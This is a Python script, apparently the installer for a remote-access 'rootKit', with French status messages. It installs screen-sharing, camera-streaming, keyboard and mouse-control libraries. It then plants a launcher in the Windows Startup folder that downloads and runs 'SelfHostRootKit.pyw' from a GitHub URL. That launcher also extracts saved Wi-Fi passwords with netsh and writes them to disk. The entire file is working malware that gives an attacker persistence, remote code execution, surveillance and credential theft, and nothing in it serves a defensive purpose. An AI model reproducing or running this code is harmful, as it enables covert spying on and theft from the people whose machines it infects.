# ! create file in C:/Users/%user%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup and C:/system #
from os import remove, chdir, system, getcwd, path
from shutil import move, rmtree
from time import sleep
from zipfile import ZipFile
from subprocess import Popen, getoutput
import getpass

githubUrl = "https://raw.githubusercontent.com/N0SAFE/kit-local/main/rootKit/"
try:
    from requests import get
except:
    system("pip install requests")
    system("start "+path.realpath(__file__)[:-len(path.basename(__file__))-1]+"\\dl.py")
    exit()
try:
    import easyimporting
except:
    system("pip install easyimporting")
    system("start "+path.realpath(__file__)[:-len(path.basename(__file__))-1]+"\\dl.py")
    exit()
def unzipfile(file=".zip"):
    # open ZIP file in read mode
    with ZipFile(file, 'r') as zip: 
        # extract all files
        zip.extractall() 
    remove(file)
def downloadFileGithub(file_url, data=".zip"):
    with open(data,"wb") as zip	: 
        for chunk in (get(file_url, stream = True)).iter_content(chunk_size=1024): 
             # writing one chunk at a time to zip file 
             if chunk: zip.write(chunk)
    unzipfile()
def moveFileFromDir(data, file):
    if type(file)==str:
        file = file.split()
    for f in range(len(file)):
        if file[f] != path.basename(__file__):
            move(getcwd().replace('\\', '/')+"/"+data+"/"+file [f], getcwd().replace('\\', '/'))

try:
    import vidstream
except:
    dir = "whl-main"
    downloadFileGithub("https://github.com/N0SAFE/whl/archive/refs/heads/main.zip")
    print(getoutput("python -m pip install whl-main/PyAudio-0.2.11-cp39-cp39-win_amd64.whl"))
    rmtree("whl-main")
    print("installation de vidtream veuillez attendre")
    print(getoutput("python -m pip install vidstream"))
    system("start "+path.realpath(__file__)[:-len(path.basename(__file__))-1]+"\\dl.py")
    exit()
from vidstream import ScreenShareClient, CameraClient
try:
    import pyautogui, socket, lib_platform, pyaudio, keyboard, mouse, colored
except:
    easyimporting.importing("pyautogui lib_platform keyboard mouse colored")
    system("start "+path.realpath(__file__)[:-len(path.basename(__file__))-1]+"\\dl.py")
    exit()
with open('lancement.pyw', 'w', encoding="utf-8") as file:
    file.write("""
from os import remove, chdir, mkdir
from urllib.request import urlopen
from shutil import move
from subprocess import Popen
with open("SelfHostRootKit.pyw", 'w'):
    pass
with open("SelfHostRootKit.pyw", "a") as file:
    file.write((urlopen('https://raw.githubusercontent.com/N0SAFE/kit-local/main/rootKit/SelfHostRootKit.pyw')).read().decode())
try:
    remove("C:\system/SelfHostRootKit.pyw")
except:
    pass
try:
    mkdir('C:\system')
except:
    pass
move('SelfHostRootKit.pyw', 'C:\system')
chdir("C:\system")
Popen("start SelfHostRootKit.pyw", shell=True)

def getWifi():
    import subprocess
    ret = ''
    for i in subprocess.Popen('netsh wlan show profile',stdout=subprocess.PIPE).stdout.read().decode('ascii', "ignore").split('\\n'):
        try:
            i.split(': ')[1]
            try:
                ret += i.split(': ')[1]+'-_-'+(subprocess.Popen(f'netsh wlan show profile name={i.split(": ")[1]} key=clear | findstr "clé"',stdout=subprocess.PIPE, shell=True).stdout.read().decode('ascii', "ignore").split(': ')[1])+'(-)'
            except:
                pass
        except:
            pass
    return ret.replace('\\n', '').replace('\\r', '')

with open('C:/system/test', 'w') as file:
    file.write(getWifi())""")
try:
    remove("C:/Users/"+getpass.getuser()+"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup/lancement.pyw")
except:
    pass

move('lancement.pyw', 'C:/Users/'+getpass.getuser()+'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
chdir('C:/Users/'+getpass.getuser()+'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
system('start lancement.pyw')
